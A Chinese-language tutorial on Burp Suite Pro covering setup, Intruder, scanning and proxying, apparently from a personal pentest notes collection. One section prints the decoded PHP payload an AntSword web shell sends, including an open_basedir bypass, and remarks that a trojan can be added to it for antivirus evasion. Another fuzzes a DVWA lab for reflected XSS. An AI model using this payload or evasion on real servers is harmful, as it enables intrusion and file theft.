 The most complete and widely used pentesting toolkit available.

## 1. Init

选择临时项目

![](./../../../images/Burp_Suite/%E9%80%89%E6%8B%A9%E4%B8%B4%E6%97%B6%E9%A1%B9%E7%9B%AE.png)

使用默认配置启动

![](./../../../images/Burp_Suite/%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%90%AF%E5%8A%A8.png)

浏览器配置 Burp Suite 代理打开以下链接，下载 `cacert.der` 

> http://127.0.0.1:8080/

![](./../../../images/Burp_Suite/%E6%B5%8F%E8%A7%88%E5%99%A8%E9%85%8D%E7%BD%AE%20Burp%20Suite%20%E4%BB%A3%E7%90%86%E6%89%93%E5%BC%80%E4%BB%A5%E4%B8%8B%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%B8%8B%E8%BD%BD%20cacert.der.png)

导入至 Trusted Root Certification Authorities

在安装目录创建文件夹 `Extensions`

```
%UserProfile%\AppData\Local\Programs\BurpSuitePro\Extensions
```

> 所有的扩展都要下载到这个目录中

下载 [jython-standalone.jar](https://central.sonatype.com/artifact/org.python/jython-standalone/versions) 到 `Extensions` 文件夹

启动 Burp Suite, 配置 Python 环境

![启动 Burp Suite, 配置 Python 环境](./../../../images/Burp_Suite/%E5%90%AF%E5%8A%A8%20Burp%20Suite,%20%E9%85%8D%E7%BD%AE%20Python%20%E7%8E%AF%E5%A2%83.png)

## 2. Usage

更改外观字体大小

![](./../../../images/Burp_Suite/%E6%9B%B4%E6%94%B9%E5%A4%96%E8%A7%82%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F.png)

修改 HTTP 消息显示字体

![](./../../../images/Burp_Suite/%E4%BF%AE%E6%94%B9%20HTTP%20%E6%B6%88%E6%81%AF%E6%98%BE%E7%A4%BA%E5%AD%97%E4%BD%93.png)

指定 UTF-8 字符集

![](./../../../images/Burp_Suite/%E6%8C%87%E5%AE%9A%20UTF-8%20%E5%AD%97%E7%AC%A6%E9%9B%86.png)

### 2.1. Proxy

Burp Suite 的抓包代理仅支持 HTTP 协议

### 2.1.1. Intruder

Burp Suite Intruder 中有四种 Attack type

```
Sniper        # 一个字典，逐个测试
Battering ram # 一个字典，同步测试
Pitchfork     # 多个字典, 并行测试
Cluster bomb  # 多个字典, 穷举测试
```

使用 Grep - Match 匹配中文时需要使用 Regex 类型匹配 UTF-8 编码

```python
print("登录失败".encode("utf-8"))
```

### 2.1.2. Intercept response

在 Burp Suite 的 Intercepr 中拦截返回包

![](./../../../images/Burp_Suite/%E5%9C%A8%20Burp%20Suite%20%E7%9A%84%20Intercepr%20%E4%B8%AD%E6%8B%A6%E6%88%AA%E8%BF%94%E5%9B%9E%E5%8C%85.png)

### 2.1.3. Payloads

### 2.1.3.1. Payload settings [Numbers]

设置数字位数范围

![](./../../../images/Burp_Suite/%E8%AE%BE%E7%BD%AE%E6%95%B0%E5%AD%97%E4%BD%8D%E6%95%B0%E8%8C%83%E5%9B%B4.png)

### 2.1.4. Payload processing

使用 Payload processing 对 Payload 进行各种自动化处理

![](./../../../images/Burp_Suite/%E4%BD%BF%E7%94%A8%20Payload%20processing%20%E5%AF%B9%20Payload%20%E8%BF%9B%E8%A1%8C%E5%90%84%E7%A7%8D%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86.png)

### 2.1.5. 爆破时处理 payload

![](./../../../images/Burp_Suite/%E7%88%86%E7%A0%B4%E6%97%B6%E5%A4%84%E7%90%86%20Payload.png)

### 2.2. Comparer

将多个数据包发送到 Comparer 进行比对

![](./../../../images/Burp_Suite/%E5%B0%86%E5%A4%9A%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%91%E9%80%81%E5%88%B0%20Comparer%20%E8%BF%9B%E8%A1%8C%E6%AF%94%E5%AF%B9.png)

### 2.3. Target

### 2.3.1. Scope

在 Target 中设置 Scope, 仅捕获 `example.com` 及其子域名的数据包

![](../../../images/Burp_Suite/在%20Target%20中设置%20Scope,%20仅捕获%20`example.com`%20及其子域名的数据包.png)

### 2.4. Extensions

将下载好的扩展包解压到 `.\BurpSuitePro\Extensions\` 目录中

添加 Extension

![](./../../../images/Burp_Suite/%E6%B7%BB%E5%8A%A0%20Extension.png)

勾选扩展以加载

![](./../../../images/Burp_Suite/%E5%8B%BE%E9%80%89%E6%89%A9%E5%B1%95%E4%BB%A5%E5%8A%A0%E8%BD%BD.png)

### 2.5. 在本地侦听其它计算机

将代理指定为本机 IP

![](./../../../images/Burp_Suite/%E5%B0%86%E4%BB%A3%E7%90%86%E6%8C%87%E5%AE%9A%E4%B8%BA%E6%9C%AC%E6%9C%BA%20IP.png)

在其它计算机配置代理

```
192.168.1.102：8080
```

访问 http://burpsuite/ ,安装证书后，可通过 BurpSuite 代理正常访问

### 2.6. 捕获蚁剑连接木马的数据包

使用 BurpSuite 对蚁剑连接一句话木马抓包，分析虚拟终端原理

关闭拦截

![](./../../../images/Burp_Suite/%E5%85%B3%E9%97%AD%E6%8B%A6%E6%88%AA.png)

添加代理

> 需要添加一个目标能访问到的代理

![](./../../../images/Burp_Suite/%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86%201.png)

![](./../../../images/Burp_Suite/%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86%202.png)

给蚁剑配置代理

![](./../../../images/Burp_Suite/%E7%BB%99%E8%9A%81%E5%89%91%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%201.png)

![](./../../../images/Burp_Suite/%E7%BB%99%E8%9A%81%E5%89%91%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%202.png)

在 HTTP 历史记录中查看，用蚁剑连接目标后刷新

![](./../../../images/Burp_Suite/%E5%9C%A8%20HTTP%20%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E4%B8%AD%E6%9F%A5%E7%9C%8B%EF%BC%8C%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E7%9B%AE%E6%A0%87%E5%90%8E%E5%88%B7%E6%96%B0.png)

> 捕获到了数据包

选中可查看捕获的数据包

![](./../../../images/Burp_Suite/%E9%80%89%E4%B8%AD%E5%8F%AF%E6%9F%A5%E7%9C%8B%E6%8D%95%E8%8E%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85.png)

### 2.6.1. 修改请求数据包

打开拦截

![](./../../../images/Burp_Suite/%E6%89%93%E5%BC%80%E6%8B%A6%E6%88%AA.png)

蚁剑连接到目标刷新

![](./../../../images/Burp_Suite/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%88%B0%E7%9B%AE%E6%A0%87%E5%88%B7%E6%96%B0.png)

> 可以看到，由于开启了拦截，蚁剑无法连接到到目标。

复制编码

![](./../../../images/Burp_Suite/%E5%A4%8D%E5%88%B6%E7%BC%96%E7%A0%81.png)

粘贴到编码工具中用 URL 解码

![](./../../../images/Burp_Suite/%E7%B2%98%E8%B4%B4%E5%88%B0%E7%BC%96%E7%A0%81%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%94%A8%20URL%20%E8%A7%A3%E7%A0%81.png)

复制解码后的文本到文本编辑器查看

```php
@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.70f94b11fb2c";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "4435"."fedf3";echo @asenc($output);echo "aac1b5"."3e6fee";}ob_start();try{$D=base64_decode(substr($_POST["v8255f661bbec7"],2));$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="	".$T."	".@filesize($P)."	".$E."
";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();&v8255f661bbec7=CsL3Zhci93d3cvaHRtbC91cGxvYWQv
```

> 可以在原有代码的基础上加入木马，做免杀。

### 2.7. 自动化测试 XSS 漏洞

burp 开启拦截，提交任意参数，发送请求数据包到 intruder 中

> http://centos7-6.local/dvwa/vulnerabilities/xss_r/

清除 payload 位置，选中需要注入的位置添加 payload 位置

```
§123§
```

上传 xss 字典到桌面

> kali 的字典在
>
>  /usr/share/wordlists/wfuzz/Injections/XSS.txt

payload 类型选择为指定文件

![](./../../../images/Burp_Suite/Payload%20%E7%B1%BB%E5%9E%8B%E9%80%89%E6%8B%A9%E4%B8%BA%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6.png)

在 payload 中加载字典

![](./../../../images/Burp_Suite/%E5%9C%A8%20Payload%20%E4%B8%AD%E5%8A%A0%E8%BD%BD%E5%AD%97%E5%85%B8.png)

> 字典不要放在中文路径下
>
> 如果字典中有编码，可能需要关闭 payload 编码，避免二次编码
>
> 最大并发请求：1

点击开始攻击，测试在结果中的响应，查看是否有过滤，转义

在设置中开启检索 - Payloads

![](./../../../images/Burp_Suite/%E5%9C%A8%E8%AE%BE%E7%BD%AE%E4%B8%AD%E5%BC%80%E5%90%AF%E6%A3%80%E7%B4%A2%20-%20Payloads.png)

再次攻击

查看结果

![](./../../../images/Burp_Suite/%E6%9F%A5%E7%9C%8B%E7%BB%93%E6%9E%9C.png)

> 在 P grep 一栏中，参数为 1 的，说明成功执行

### 2.8. 漏洞扫描

关闭拦截

在获得的网站数据右键，主动扫描此分支

![](./../../../images/Burp_Suite/%E5%9C%A8%E8%8E%B7%E5%BE%97%E7%9A%84%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8F%B3%E9%94%AE%EF%BC%8C%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F%E6%AD%A4%E5%88%86%E6%94%AF.png)

在目标网站提交多处任意内容，增加扫描范围

> 开始扫描以后可在仪表盘中查看扫描结果
>
> 要提高扫描率可加载相应的插件

安装某些插件时，需要在扩展设置中安装环境

![](./../../../images/Burp_Suite/%E5%AE%89%E8%A3%85%E6%9F%90%E4%BA%9B%E6%8F%92%E4%BB%B6%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%89%A9%E5%B1%95%E8%AE%BE%E7%BD%AE%E4%B8%AD%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83.png)

其中扫描某些页面时会有无效信息，占用时间，需要删除

![](./../../../images/Burp_Suite/%E5%85%B6%E4%B8%AD%E6%89%AB%E6%8F%8F%E6%9F%90%E4%BA%9B%E9%A1%B5%E9%9D%A2%E6%97%B6%E4%BC%9A%E6%9C%89%E6%97%A0%E6%95%88%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%8D%A0%E7%94%A8%E6%97%B6%E9%97%B4%EF%BC%8C%E9%9C%80%E8%A6%81%E5%88%A0%E9%99%A4.png)

> 以上页面是谷歌验证码

### 2.9. 保存项目

新建一个项目并打开

![](./../../../images/Burp_Suite/%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%B9%B6%E6%89%93%E5%BC%80.png)

在这个项目中运行过的任务会自动保存, 重新运行时加载这个项目文件即可恢复.

![](./../../../images/Burp_Suite/%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%90%E8%A1%8C%E8%BF%87%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%BF%9D%E5%AD%98,%20%E9%87%8D%E6%96%B0%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8A%A0%E8%BD%BD%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E5%8D%B3%E5%8F%AF%E6%81%A2%E5%A4%8D..png)

Intruder 的运行结果可以选择保存到项目文件

![](./../../../images/Burp_Suite/Intruder%20%E7%9A%84%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%AF%E4%BB%A5%E9%80%89%E6%8B%A9%E4%BF%9D%E5%AD%98%E5%88%B0%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6.png)

重新加载项目文件后可在 Dashboard 中恢复

![](./../../../images/Burp_Suite/%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%AF%E5%9C%A8%20Dashboard%20%E4%B8%AD%E6%81%A2%E5%A4%8D.png)

---

References

- [Burp Suite](https://portswigger.net/burp/pro)
- [Burp Suite documentation](https://portswigger.net/burp/documentation)
